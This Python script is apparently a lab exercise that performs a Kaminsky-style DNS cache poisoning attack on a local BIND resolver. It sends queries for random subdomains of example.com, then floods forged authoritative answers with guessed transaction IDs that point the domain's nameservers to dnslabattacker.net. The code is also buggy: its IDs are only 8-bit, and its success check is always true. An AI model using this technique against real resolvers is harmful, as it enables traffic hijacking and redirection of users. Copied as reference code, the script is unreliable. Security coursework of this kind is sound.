#!/usr/bin/env python
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '127.0.0.1'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))


'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
	sendPacket(sock, dnsPacket, my_ip, my_port)
	response = sock.recv(4096)
	response = DNS(response)
	print "\n***** Packet Received from Remote Server *****"
	print response.show()
	print "***** End of Remote Server Packet *****\n"

	#build fake site for fake DNS and response
	
	hack = True
	
	while hack:
		fakeSite = getRandomSubDomain() + ".example.com"	
		dnsPacket.qd.qname = fakeSite
	
		response.qd.qname = fakeSite
		response.aa = 1
		response.an.rrname = fakeSite
		response.an.rdata = "1.2.3.4"
		#if response.nscount != 2: 
		#	if response.nscount > 2:			
		#		for j in  range(2,response.nscount):
		#			response.ns[j].rdata = None	
		#	response.nscount = 2
		response.ns[0].rdata = "ns1.dnslabattacker.net"
		response.ns[1].rdata = "ns2.dnslabattacker.net"
		response.ar = None
		response.arcount = 0
		
		sendPacket(sock, dnsPacket, my_ip, my_port)

		for i in range(100):
			response.id = getRandomTXID()
			sendPacket(sock, response, my_ip, my_query_port)
		
		
		testPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
		sendPacket(sock, testPacket, my_ip, my_port)
		testResp = sock.recv(4096)
		testResp = DNS(testResp)
		if testResp.ns[0].rdata == "ns1.dnslabattacker.net" or "ns2.dnslabattacker.net":
			hack = False

		
if __name__ == '__main__':
	exampleSendDNSQuery()
